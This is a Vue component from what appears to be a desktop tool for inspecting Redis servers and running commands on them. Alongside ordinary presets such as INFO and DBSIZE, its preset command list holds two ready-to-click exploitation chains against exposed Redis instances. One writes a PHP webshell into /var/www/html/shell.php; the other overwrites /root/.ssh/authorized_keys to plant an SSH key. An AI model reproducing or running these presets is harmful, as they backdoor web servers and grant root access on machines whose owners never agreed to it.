<template>
  <main class="dbinfo-main">
    <el-button-group>
      <el-button type="success" @click="getDbInfo" link size="small">详情</el-button>
      <el-button type="primary" @click="openCommandDialog" link size="small">执行命令</el-button>
    </el-button-group>

    <!-- 数据库详情对话框 -->
    <el-dialog
        v-model="dialogVisible"
        :title="`数据库详情 - ${ip}`"
        width="65%"
        class="dbinfo-dialog"
        append-to-body
        destroy-on-close
    >
      <div class="table-container">
        <el-table
            :data="info"
            border
            stripe
            style="width: 100%"
            height="550"
            size="small"
        >
          <el-table-column type="index" width="60"/>
          <el-table-column prop="key" label="Key" min-width="200"/>
          <el-table-column prop="value" label="Value" />
        </el-table>
      </div>
    </el-dialog>

    <!-- 执行命令对话框 -->
    <el-dialog
        v-model="commandDialogVisible"
        title="执行 Redis 命令"
        width="75%"
        class="command-dialog"
        append-to-body
        destroy-on-close
    >
      <div class="command-container">
        <div class="command-input">
          <el-input
              v-model="command"
              placeholder="输入 Redis 命令，例如：GET key 或 HSET hash field value"
              @keyup.enter="executeCommand"
              size="default"
          >
            <template #prepend>
              <span class="command-prompt">></span>
            </template>
            <template #append>
              <el-button @click="executeCommand" type="primary" :icon="Right">执行</el-button>
            </template>
          </el-input>
        </div>

        <div class="common-commands" v-if="showCommonCommands">
          <el-divider content-position="left">常用命令</el-divider>
          <el-space wrap>
            <el-tag
                v-for="cmd in commonCommands"
                :key="cmd.command"
                type="info"
                style="cursor: pointer;"
                @click="fillCommand(cmd.command)"
            >
              {{ cmd.name }} ({{ cmd.command }})
            </el-tag>
          </el-space>
        </div>

        <div class="result-section" v-if="commandResult">
          <el-divider content-position="left">执行结果</el-divider>
          <div class="result-content">
            <el-alert
                :title="`执行${commandResult.success ? '成功' : '失败'} - 耗时: ${commandResult.duration}ms`"
                :type="commandResult.success ? 'success' : 'error'"
                :closable="false"
                :description="commandResult.error || ''"
            />

            <div
                class="result-data"
                v-if="commandResult.success && commandResult.data !== null && commandResult.data !== undefined"
            >
              <div class="result-header">
                <span class="result-type">数据类型: {{ getDataType(commandResult.data) }}</span>
                <span class="result-count" v-if="getDataCount(commandResult.data) > 0">
          数量: {{ getDataCount(commandResult.data) }}
        </span>
                <el-button
                    size="small"
                    link
                    @click="copyResult"
                    v-if="commandResult.data"
                    class="copy-btn"
                >
                  <el-icon><CopyDocument /></el-icon>
                  复制
                </el-button>
              </div>

              <div class="result-body">
                <!-- Redis INFO 命令结果美化 -->
                <div v-if="isRedisInfoResult(commandResult.data)" class="redis-info-result">
                  <div
                      v-for="(section, sectionName) in parseRedisInfo(commandResult.data)"
                      :key="sectionName"
                      class="info-section"
                  >
                    <h4 class="section-title">{{ sectionName }}</h4>
                    <div class="section-content">
                      <div
                          v-for="(value, key) in section"
                          :key="key"
                          class="info-item"
                      >
                        <span class="info-key">{{ key }}:</span>
                        <span class="info-value">{{ value }}</span>
                      </div>
                    </div>
                  </div>
                </div>

                <!-- 其他类型的结果 -->
                <div v-else>
                  <pre :class="getResultClass(commandResult.data)">{{ formatResult(commandResult.data) }}</pre>
                </div>
              </div>
            </div>

            <!-- 空结果提示 -->
            <div
                class="empty-result"
                v-else-if="commandResult.success && (commandResult.data === null || commandResult.data === undefined)"
            >
              <el-empty description="无返回数据" :image-size="80" />
            </div>
          </div>
        </div>

        <div class="command-history" v-if="commandHistory.length > 0">
          <el-divider content-position="left">历史命令</el-divider>
          <div class="history-list">
            <div
                v-for="(item, index) in commandHistory"
                :key="index"
                class="history-item"
                @click="fillCommand(item.command)"
            >
              <span class="command-text">{{ item.command }}</span>
              <span class="result-status" :class="item.success ? 'success' : 'error'">
                {{ item.success ? '✓' : '✗' }}
              </span>
            </div>
          </div>
        </div>
      </div>
    </el-dialog>
  </main>
</template>

<script setup>
import { ref, computed, onMounted } from 'vue';
import { DbInfo, ExecuteCommand, GetCommandHistory } from '../../../wailsjs/go/nosql/NoSQL';
import { ElMessage } from 'element-plus';
import { CopyDocument, Right } from "@element-plus/icons-vue";

// 定义 props
const props = defineProps(['data']);

// 响应式数据
const dialogVisible = ref(false);
const commandDialogVisible = ref(false);
const info = ref([]);
const command = ref('');
const commandResult = ref(null);
const commandHistory = ref([]);

// 常用命令列表
const commonCommands = [
  { name: '查看所有键', command: 'KEYS *' },
  { name: '查看信息', command: 'INFO' },
  { name: '查看客户端', command: 'CLIENT LIST' },
  { name: '查看内存', command: 'INFO MEMORY' },
  { name: '查看配置', command: 'CONFIG GET *' },
  { name: '查看慢查询', command: 'SLOWLOG GET 10' },
  { name: '数据库大小', command: 'DBSIZE' },
  { name: '查看连接', command: 'CLIENT INFO' },
  { name: '写入shell1', command: 'set shell "<?php @assert($_POST[cc]);?>"'},
  { name: '写入shell2', command: 'config set dir /var/www/html/'},
  { name: '写入shell3', command: 'config set dbfilename shell.php'},
  { name: '写入shell4', command: 'save'},
  { name: '写入ssh公钥1', command: 'config set dir /root/.ssh/'},
  { name: '写入ssh公钥2', command: 'config set dbfilename authorized_keys'},
  { name: '写入ssh公钥3', command: 'set key "\\n\\n\\生成的公钥n\\n"'},
  { name: '写入ssh公钥4', command: 'save'},
];

// 计算属性
const ip = computed(() => props.data.addr || '');
const showCommonCommands = computed(() => !command.value.trim());

// 方法定义
const getDbInfo = () => {
  dialogVisible.value = true;
  DbInfo(props.data.identity).then(res => {
    if (res.code !== 200) {
      ElMessage.error(`${res.msg}`)
      return;
    }
    info.value = res.data;
  });
};

const openCommandDialog = () => {
  commandDialogVisible.value = true;
  commandResult.value = null;
  loadCommandHistory();
};

const executeCommand = () => {
  if (!command.value.trim()) {
    ElMessage.warning('请输入命令')
    return;
  }

  ExecuteCommand(props.data.identity, command.value).then(res => {
    if (res.code !== 200) {
      commandResult.value = {
        success: false,
        error: res.msg,
        duration: 0
      };
      ElMessage.error(`${res.msg}`)
      return;
    }

    commandResult.value = {
      success: true,
      data: res.data,
      duration: res.duration || 0
    };

    addToHistory(command.value, true);

    ElMessage.success('命令执行成功')
  }).catch(err => {
    commandResult.value = {
      success: false,
      error: err.message || '执行失败',
      duration: 0
    };
    addToHistory(command.value, false);

    ElMessage.error(`命令执行失败: ${err.message}`)
  });
};

const fillCommand = (cmd) => {
  command.value = cmd;
};

const isRedisInfoResult = (data) => {
  if (typeof data !== 'string') return false;
  return data.includes('# Server') && data.includes('redis_version:');
};

const parseRedisInfo = (infoString) => {
  const sections = {};
  let currentSection = '';

  const lines = infoString.split('\n');

  lines.forEach(line => {
    line = line.trim();

    if (line.startsWith('# ')) {
      currentSection = line.substring(2).trim();
      sections[currentSection] = {};
    }
    else if (line.includes(':') && currentSection) {
      const [key, ...valueParts] = line.split(':');
      const value = valueParts.join(':').trim();
      if (key && value) {
        sections[currentSection][key.trim()] = value;
      }
    }
  });

  return sections;
};

const formatResult = (data) => {
  if (data === null || data === undefined) {
    return 'null';
  }

  if (typeof data === 'string') {
    return data;
  }

  if (typeof data === 'number') {
    return data.toString();
  }

  if (Array.isArray(data)) {
    return data.map((item, index) => {
      const formattedItem = typeof item === 'string' ? item : JSON.stringify(item, null, 2);
      return `${index + 1}) ${formattedItem}`;
    }).join('\n');
  }

  if (typeof data === 'object') {
    return JSON.stringify(data, null, 2);
  }

  return String(data);
};

const getDataType = (data) => {
  if (data === null) return 'null';
  if (Array.isArray(data)) return `数组[${data.length}]`;
  if (typeof data === 'object') return '对象';
  if (typeof data === 'string') return '字符串';
  if (typeof data === 'number') return '数字';
  if (typeof data === 'boolean') return '布尔值';
  return typeof data;
};

const getDataCount = (data) => {
  if (Array.isArray(data)) return data.length;
  if (typeof data === 'object' && data !== null) return Object.keys(data).length;
  return 0;
};

const getResultClass = (data) => {
  if (data === null) return 'null';
  if (Array.isArray(data)) return 'array';
  if (typeof data === 'object') return 'object';
  if (typeof data === 'string') return 'string';
  if (typeof data === 'number') return 'number';
  return '';
};

const copyResult = () => {
  if (!commandResult.value || !commandResult.value.data) return;

  const text = formatResult(commandResult.value.data);
  navigator.clipboard.writeText(text).then(() => {
    ElMessage.success('复制成功')
  }).catch(err => {
    ElMessage.error(`复制失败: ${err.message}`)
  });
};

const addToHistory = (cmd, success) => {
  const historyItem = {
    command: cmd,
    success: success,
    timestamp: new Date().getTime()
  };

  commandHistory.value.unshift(historyItem);

  if (commandHistory.value.length > 20) {
    commandHistory.value = commandHistory.value.slice(0, 20);
  }
};

const loadCommandHistory = () => {
  GetCommandHistory(props.data.identity).then(res => {
    if (res.code === 200 && res.data) {
      commandHistory.value = res.data;
    }
  });
};

// 生命周期
onMounted(() => {
  loadCommandHistory();
});
</script>

<style scoped>
.dbinfo-main {
  display: inline-block;
}

.command-container {
  padding: 8px 0;
}

.command-input {
  margin-bottom: 16px;
}

.command-prompt {
  color: #409EFF;
  font-weight: 600;
  font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
}

.common-commands {
  margin-bottom: 16px;
}

.common-commands :deep(.el-divider__text) {
  font-size: 12px;
  color: rgba(255, 255, 255, 0.6);
  background: transparent;
  padding: 0 12px;
}

.result-section {
  margin-top: 16px;
}

.result-content {
  margin-top: 10px;
}

.result-data {
  margin-top: 12px;
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 6px;
  overflow: hidden;
  background: rgba(0, 0, 0, 0.1);
}

.result-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 8px 12px;
  background: rgba(255, 255, 255, 0.05);
  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
  font-size: 12px;
  color: rgba(255, 255, 255, 0.7);
}

.result-type {
  font-weight: 500;
  color: rgba(255, 255, 255, 0.85);
}

.result-count {
  margin-left: auto;
  margin-right: 10px;
  color: rgba(64, 158, 255, 0.9);
}

.copy-btn {
  color: #0366d6;
  padding: 2px 6px;
}

.copy-btn:hover {
  background: #0366d6;
  color: white;
}

.result-body {
  padding: 0;
  max-height: 400px;
  overflow: auto;
}

.result-body::-webkit-scrollbar {
  width: 6px;
}

.result-body::-webkit-scrollbar-track {
  background: transparent;
}

.result-body::-webkit-scrollbar-thumb {
  background: rgba(255, 255, 255, 0.2);
  border-radius: 3px;
}

.result-body::-webkit-scrollbar-thumb:hover {
  background: rgba(255, 255, 255, 0.3);
}

/* Redis INFO 结果美化 */
.redis-info-result {
  padding: 12px;
}

.info-section {
  margin-bottom: 12px;
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 6px;
  overflow: hidden;
  background: rgba(0, 0, 0, 0.1);
}

.section-title {
  margin: 0;
  padding: 8px 12px;
  background: rgba(64, 158, 255, 0.2);
  color: rgba(255, 255, 255, 0.9);
  font-size: 13px;
  font-weight: 500;
  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
}

.section-content {
  padding: 0;
}

.info-item {
  display: flex;
  align-items: flex-start;
  padding: 8px 12px;
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
  transition: background-color 0.2s;
}

.info-item:hover {
  background: rgba(255, 255, 255, 0.05);
}

.info-item:last-child {
  border-bottom: none;
}

.info-key {
  flex: 0 0 200px;
  font-weight: 500;
  color: rgba(255, 255, 255, 0.85);
  font-size: 12px;
  word-break: break-word;
}

.info-value {
  flex: 1;
  color: rgba(255, 255, 255, 0.7);
  font-size: 12px;
  word-break: break-word;
  padding-left: 8px;
}

/* 普通文本结果 */
.result-body pre {
  margin: 0;
  padding: 12px;
  font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
  font-size: 12px;
  line-height: 1.6;
  white-space: pre-wrap;
  word-wrap: break-word;
  background: transparent;
  color: rgba(255, 255, 255, 0.8);
}

/* 不同类型的结果样式 */
.result-body pre.string {
  color: rgba(103, 194, 58, 0.9);
  background: rgba(103, 194, 58, 0.1);
}

.result-body pre.array {
  color: rgba(64, 158, 255, 0.9);
}

.result-body pre.object {
  color: rgba(144, 147, 153, 0.9);
}

.result-body pre.number {
  color: rgba(230, 162, 60, 0.9);
}

.result-body pre.null {
  color: rgba(255, 255, 255, 0.5);
  font-style: italic;
}

.result-body pre.error {
  color: rgba(245, 108, 108, 0.9);
  background: rgba(245, 108, 108, 0.1);
}


.empty-result {
  padding: 40px 0;
  text-align: center;
  color: #8c8c8c;
}

/* 响应式设计 */
@media (max-width: 768px) {
  .result-header {
    flex-direction: column;
    align-items: flex-start;
    gap: 8px;
  }

  .result-count {
    margin-left: 0;
    margin-right: 0;
  }

  .info-item {
    flex-direction: column;
    align-items: flex-start;
  }

  .info-key {
    flex: none;
    margin-bottom: 4px;
  }

  .info-value {
    padding-left: 0;
  }
}


.command-history {
  margin-top: 16px;
}

.command-history :deep(.el-divider__text) {
  font-size: 12px;
  color: rgba(255, 255, 255, 0.6);
  background: transparent;
  padding: 0 12px;
}

.history-list {
  max-height: 200px;
  overflow-y: auto;
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 6px;
  background: rgba(0, 0, 0, 0.1);
}

.history-list::-webkit-scrollbar {
  width: 6px;
}

.history-list::-webkit-scrollbar-track {
  background: transparent;
}

.history-list::-webkit-scrollbar-thumb {
  background: rgba(255, 255, 255, 0.2);
  border-radius: 3px;
}

.history-list::-webkit-scrollbar-thumb:hover {
  background: rgba(255, 255, 255, 0.3);
}

.history-item {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 8px 12px;
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
  cursor: pointer;
  transition: background-color 0.2s;
}

.history-item:hover {
  background-color: rgba(255, 255, 255, 0.05);
}

.history-item:last-child {
  border-bottom: none;
}

.command-text {
  flex: 1;
  font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
  font-size: 12px;
  color: rgba(255, 255, 255, 0.7);
}

.result-status {
  margin-left: 10px;
  font-weight: bold;
}

.result-status.success {
  color: rgba(103, 194, 58, 0.9);
}

.result-status.error {
  color: rgba(245, 108, 108, 0.9);
}

/* 对话框样式优化 */
:deep(.dbinfo-dialog .el-dialog__body),
:deep(.command-dialog .el-dialog__body) {
  padding: 16px 20px;
  background: rgba(0, 0, 0, 0.3);
}

:deep(.dbinfo-dialog .el-dialog__header),
:deep(.command-dialog .el-dialog__header) {
  padding: 16px 20px;
  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
  background: rgba(0, 0, 0, 0.2);
}

:deep(.dbinfo-dialog .el-dialog__title),
:deep(.command-dialog .el-dialog__title) {
  color: rgba(255, 255, 255, 0.9);
  font-size: 15px;
  font-weight: 500;
}

:deep(.dbinfo-dialog .el-table),
:deep(.command-dialog .el-table) {
  background: transparent;
}

:deep(.dbinfo-dialog .el-table th),
:deep(.command-dialog .el-table th) {
  background: rgba(255, 255, 255, 0.05);
  color: rgba(255, 255, 255, 0.8);
  border-color: rgba(255, 255, 255, 0.1);
}

:deep(.dbinfo-dialog .el-table td),
:deep(.command-dialog .el-table td) {
  background: transparent;
  color: rgba(255, 255, 255, 0.7);
  border-color: rgba(255, 255, 255, 0.08);
}

:deep(.dbinfo-dialog .el-table tr:hover > td),
:deep(.command-dialog .el-table tr:hover > td) {
  background: rgba(255, 255, 255, 0.05);
}
</style>